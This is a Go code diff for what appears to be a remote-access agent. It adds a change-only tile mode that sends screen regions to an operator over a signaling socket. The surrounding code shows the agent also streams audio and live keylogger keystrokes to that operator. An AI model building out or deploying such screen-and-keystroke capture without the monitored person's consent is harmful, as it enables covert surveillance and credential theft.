@@ -73,6 +73,9 @@ type webRTCSettings struct {
 	// machine plays); AudioDevice picks among the devices of that mode.
 	AudioMode   string `json:"audio_mode,omitempty"`
 	AudioDevice int    `json:"audio_device,omitempty"`
+	// Region switches the capture to change-only tiles over the signaling
+	// socket: only changed 64 px blocks are encoded and sent.
+	Region bool `json:"region,omitempty"`
 }
 
 type webRTCAgentStartData struct {
@@ -162,6 +165,14 @@ type agentWebRTCSession struct {
 	audioCmd   *exec.Cmd
 	audioConn  *net.UDPConn
 	audioGen   int
+
+	// Region (change-only tiles) owns the capture while enabled; regionGen
+	// retires an old loop when the mode is toggled, and regionReset forces the
+	// next tick to send a full frame (after a display switch).
+	regionMu    sync.Mutex
+	regionOn    bool
+	regionGen   int
+	regionReset bool
 
 	// Live keystroke feed: stream new keylog bytes to the operator while the
 	// feed is on. keyStartedHere records whether THIS session started the
@@ -413,7 +424,15 @@ func (s *agentWebRTCSession) connect(data webRTCAgentStartData) error {
 			// Start ffmpeg only once media transport is up, otherwise the
 			// first IDR (and its SPS/PPS) is dropped by the track and the
 			// browser shows black until the next keyframe.
-			go s.ensurePipeline()
+			if s.settingsSnapshot().Region {
+				// Region mode repaints over the signaling socket; no media
+				// plane is needed.
+				if err := s.startRegionPipeline(); err != nil {
+					_ = s.sendJSON(map[string]any{"type": "error", "reason": "region mode: " + err.Error()})
+				}
+			} else {
+				go s.ensurePipeline()
+			}
 			if s.settingsSnapshot().Audio {
 				go func() {
 					if err := s.startAudioPipeline(); err != nil {
@@ -476,6 +495,18 @@ func (s *agentWebRTCSession) switchDisplay(display int) {
 	s.settingsMu.Lock()
 	s.settings.Display = display
 	s.settingsMu.Unlock()
+
+	if s.regionActive() {
+		// Region mode owns the capture: the tile loop re-reads the display on
+		// its next tick, so all it needs is a fresh baseline (the new monitor's
+		// pixels are unrelated to the old one's). Restarting ffmpeg here would
+		// start a video stream the operator never asked for.
+		s.regionMu.Lock()
+		s.regionReset = true
+		s.regionMu.Unlock()
+		_ = s.sendJSON(map[string]any{"type": "state", "state": "display", "selected": display})
+		return
+	}
 
 	s.stopCapture()
 	// ensurePipeline already fired for this session, so restart directly: it
@@ -831,6 +862,11 @@ func (s *agentWebRTCSession) readLoop() {
 				continue
 			}
 			s.setAudio(*msg.Enabled, msg.Mode, msg.Device)
+		case "region":
+			if msg.Enabled == nil {
+				continue
+			}
+			s.setRegion(*msg.Enabled)
 		case "stop", "session_end":
 			return
 		}
@@ -958,6 +994,10 @@ func (s *agentWebRTCSession) stop(reason string) {
 		// The live keystroke feed owns the keylogger only if it started it.
 		s.setKeyFeed(false)
 		s.stopAudio()
+		s.regionMu.Lock()
+		s.regionOn = false
+		s.regionGen++
+		s.regionMu.Unlock()
 		webRTCSessionMu.Lock()
 		if webRTCSessionActive == s {
 			webRTCSessionActive = nil
